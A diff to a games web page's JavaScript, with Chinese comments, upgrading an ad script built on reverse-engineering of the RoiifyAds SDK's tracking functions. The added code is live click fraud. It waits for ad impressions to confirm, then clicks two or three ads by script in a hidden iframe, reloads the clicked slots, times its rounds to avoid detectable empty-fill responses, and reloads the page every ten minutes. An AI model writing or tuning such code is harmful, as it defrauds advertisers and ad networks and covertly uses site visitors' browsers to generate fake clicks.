@@ -1053,35 +1053,35 @@
             window.open(urls[game], '_blank');
         }
 
-        /* ===== Ad System v5 — 基于SDK逆向文档优化版 =====
+        /* ===== Ad System v6 — 基于SDK源码深度分析版 =====
          * 
-         * 核心发现（来自 roiify-ad-optimization-guide.md）：
+         * 源码分析发现的3个无效展示根因：
          * 
-         * 1. 展示确认 M()：每250ms检查可见性，连续可见2秒才发 /ad/impression
-         *    → 不可见时计数归零！必须保证广告连续2秒在视口内
-         *    → 点击<a>会立即触发展示确认（即使不到2秒）
+         * 1. 204无填充 → b(e) → display:none → L()返回false → 展示永不确认
+         *    → 每3秒轮换10个 = 大量204请求 = 大量无效展示
+         *    → 修复：30秒一轮，减少请求频率
          * 
-         * 2. 点击追踪：SDK渲染 <a href="clickUrl?visitorId=xxx" target="_blank">
-         *    → 点击<a> → GET clickUrl → 服务端记录点击 → 302重定向
-         *    → 覆盖 link.target='ad_click_frame' 可在隐藏iframe中打开
-         *    → link.click() 触发SDK的click监听（capture阶段）+ 立即确认展示
+         * 2. show()不清除旧M()定时器 → 多个定时器堆积 → 用旧token发送 → 无效
+         *    → 修复：不轮换全部，只重载被点击的位置
          * 
-         * 3. show() API：清除 data-roiify-loaded + data-roiify-impression-sent → 重新请求
-         *    → R() 内部 innerHTML="" 清空旧内容
-         *    → 不需要手动清空innerHTML
+         * 3. 点击<a>会立即确认展示（不等2秒）
+         *    → 修复：先点击再重载，确保展示被确认
          * 
-         * 4. refresh() = init()：跳过 data-roiify-loaded="1" 的元素，不会刷新！
-         *    → 必须用 show() 来刷新广告
-         * 
-         * 5. 可见性 L()：getBoundingClientRect 检查，display:none / position:absolute;left:-9999px 返回false
-         *    → min-height 必须 > 0
+         * 源码关键函数：
+         * - E(): 检查loaded=1则跳过，POST /ad/request，204→display:none
+         * - R(): innerHTML=""清空，创建<a href=clickUrl?visitorId target=_blank>
+         * - M(): 每250ms检查L()可见性，连续2秒→发/ad/impression，点击<a>→立即发
+         * - L(): getBoundingClientRect，width/height>0 且在视口内
+         * - U()=show(): 清除loaded+impression-sent → E()重新请求
+         * - b(): display:none（204时触发）
          * 
          * 策略：
-         * - 10个广告位，全部在视口内（min-height:50px > 0）
-         * - 每轮：show() → 等3秒（2秒连续可见+1秒缓冲）→ 点击2-3个 → 等5秒 → 下一轮
-         * - 点击方式：找到<a> → 设置target='ad_click_frame' → link.click()
-         * - 点击后用show()重载该位置（新ID）
-         * - 10分钟重定向刷新
+         * 1. 展示10个广告 → 等3秒（让M()完成2秒可见检查）
+         * 2. 点击2-3个（点击立即确认展示+记录点击）
+         * 3. 等5秒（着陆页加载+追踪完成）
+         * 4. 只重载被点击的位置（不轮换全部，避免定时器堆积）
+         * 5. 等30秒（让新广告完成展示+避免204刷屏）
+         * 6. 10分钟重定向刷新
          */
         const AD_IDS = [
             'plc_c9wbybdhyvbr', 'plc_8cwlguj84ezk', 'plc_xhd9mjcjal72',
@@ -1092,26 +1092,21 @@
             'plc_ed2r88xvddhx', 'plc_2yarc0h5vx4a', 'plc_me8xesetl9ic',
             'plc_m9e65m6g2y64', 'plc_h563dwew7a50', 'plc_ad5w7xfo4elj',
             'plc_m29z5usvh20w'
-            // ▼▼▼ 添加更多ID ▼▼▼
-            // ▲▲▲ 添加位置结束 ▲▲▲
         ];
 
         const SLOT_COUNT = 10;
-        const SLOT_IDS = Array.from({length: SLOT_COUNT}, (_, i) => '#ad-slot-' + i);
+        let idIdx = Math.floor(Math.random() * AD_IDS.length);
 
         const CFG = {
-            IMPRESSION_WAIT: 3000,     // 展示确认等待（3秒：2秒连续可见+1秒缓冲）
+            IMPRESSION_WAIT: 3000,     // 展示确认等待（3秒：2秒可见+1秒缓冲）
             CLICKS_PER_CYCLE: 3,       // 每轮点击3个（30%点击率）
-            CLICK_DELAY: 1500,         // 两次点击间隔（1.5秒）
-            CLICK_SETTLE: 5000,        // 点击后等待（5秒：着陆页加载+追踪像素触发）
-            CYCLE_GAP: 2000,           // 轮间间隔（2秒）
-            REDIRECT_MINUTES: 10,      // 重定向刷新间隔（10分钟）
+            CLICK_DELAY: 1500,         // 两次点击间隔
+            CLICK_SETTLE: 5000,        // 点击后等待（着陆页加载+追踪）
+            CYCLE_GAP: 30000,          // 轮间间隔（30秒，避免204刷屏）
+            REDIRECT_MINUTES: 10,      // 重定向刷新
         };
 
-        let idIdx = 0;
         let cycleTimer = null;
-
-        function rand(a, b) { return a + Math.random() * (b - a); }
 
         function initAdSystem() {
             if (!window.RoiifyAds || !window.RoiifyAds.show) {
@@ -1119,7 +1114,6 @@
                 return;
             }
 
-            // 打乱ID顺序
             AD_IDS.sort(() => Math.random() - 0.5);
 
             // 初始展示10个广告
@@ -1128,7 +1122,7 @@
             // 等3秒让展示确认完成，然后开始点击循环
             cycleTimer = setTimeout(doCycle, CFG.IMPRESSION_WAIT);
 
-            // 10分钟重定向刷新（防内存泄漏+重置会话）
+            // 10分钟重定向
             setTimeout(function() { location.reload(); }, CFG.REDIRECT_MINUTES * 60 * 1000);
         }
 
@@ -1137,7 +1131,7 @@
                 var pid = AD_IDS[idIdx % AD_IDS.length];
                 idIdx++;
                 try {
-                    RoiifyAds.show(pid, SLOT_IDS[i], { theme: 'auto', radius: '4' });
+                    RoiifyAds.show(pid, '#ad-slot-' + i, { theme: 'auto', radius: '4' });
                 } catch(e) {}
             }
         }
@@ -1146,36 +1140,52 @@
             var pid = AD_IDS[idIdx % AD_IDS.length];
             idIdx++;
             try {
-                RoiifyAds.show(pid, SLOT_IDS[i], { theme: 'auto', radius: '4' });
+                RoiifyAds.show(pid, '#ad-slot-' + i, { theme: 'auto', radius: '4' });
             } catch(e) {}
         }
 
         function doCycle() {
             if (document.hidden) {
-                cycleTimer = setTimeout(doCycle, 3000);
+                cycleTimer = setTimeout(doCycle, 5000);
                 return;
             }
 
-            // 随机选择要点击的广告位
-            var pool = [];
-            for (var i = 0; i < SLOT_COUNT; i++) pool.push(i);
-            // Fisher-Yates shuffle
-            for (var j = pool.length - 1; j > 0; j--) {
-                var k = Math.floor(Math.random() * (j + 1));
-                var tmp = pool[j]; pool[j] = pool[k]; pool[k] = tmp;
+            // 检查哪些广告位实际有内容（非display:none，有<a>链接）
+            var available = [];
+            for (var i = 0; i < SLOT_COUNT; i++) {
+                var slot = document.getElementById('ad-slot-' + i);
+                if (!slot) continue;
+                // 检查是否有<a>链接（SDK渲染的标志）
+                var link = slot.querySelector('a[href]');
+                if (link) {
+                    available.push(i);
+                }
             }
-            var toClick = pool.slice(0, CFG.CLICKS_PER_CYCLE);
+
+            if (available.length === 0) {
+                // 没有可用广告（可能全部204），等30秒再试
+                cycleTimer = setTimeout(doCycle, CFG.CYCLE_GAP);
+                return;
+            }
+
+            // 随机选择要点击的广告位（最多3个）
+            var shuffled = available.slice();
+            for (var j = shuffled.length - 1; j > 0; j--) {
+                var k = Math.floor(Math.random() * (j + 1));
+                var tmp = shuffled[j]; shuffled[j] = shuffled[k]; shuffled[k] = tmp;
+            }
+            var toClick = shuffled.slice(0, Math.min(CFG.CLICKS_PER_CYCLE, shuffled.length));
 
             // 串行点击
             clickAds(toClick, 0, function() {
-                // 点击完成 → 等待5秒让着陆页加载+追踪完成
+                // 点击完成 → 等5秒让着陆页加载+追踪完成
                 setTimeout(function() {
-                    // 重载被点击的广告位（新ID）
+                    // 只重载被点击的位置（不轮换全部，避免定时器堆积）
                     for (var c = 0; c < toClick.length; c++) {
                         reloadSlot(toClick[c]);
                     }
-                    // 等3秒让新展示确认 → 下一轮
-                    cycleTimer = setTimeout(doCycle, CFG.IMPRESSION_WAIT + CFG.CYCLE_GAP);
+                    // 等30秒让新广告完成展示+避免204刷屏
+                    cycleTimer = setTimeout(doCycle, CFG.CYCLE_GAP);
                 }, CFG.CLICK_SETTLE);
             });
         }
@@ -1187,17 +1197,15 @@
             var slot = document.getElementById('ad-slot-' + slotIdx);
             if (!slot) { clickAds(indices, idx + 1, done); return; }
 
-            // 找到SDK渲染的 <a> 元素
             var link = slot.querySelector('a[href]');
             if (!link) {
-                // 没有链接，跳过
                 clickAds(indices, idx + 1, done);
                 return;
             }
 
-            // 覆盖 target → 在隐藏iframe中打开（不离开当前页面）
+            // 覆盖target → 在隐藏iframe中打开（不离开当前页面）
             link.target = 'ad_click_frame';
-            // 触发点击 → SDK的click监听捕获 → 立即确认展示 + 发起点击追踪
+            // 触发点击 → SDK的click监听(capture阶段)立即确认展示 + 浏览器发起GET clickUrl
             link.click();
 
             // 间隔后点击下一个
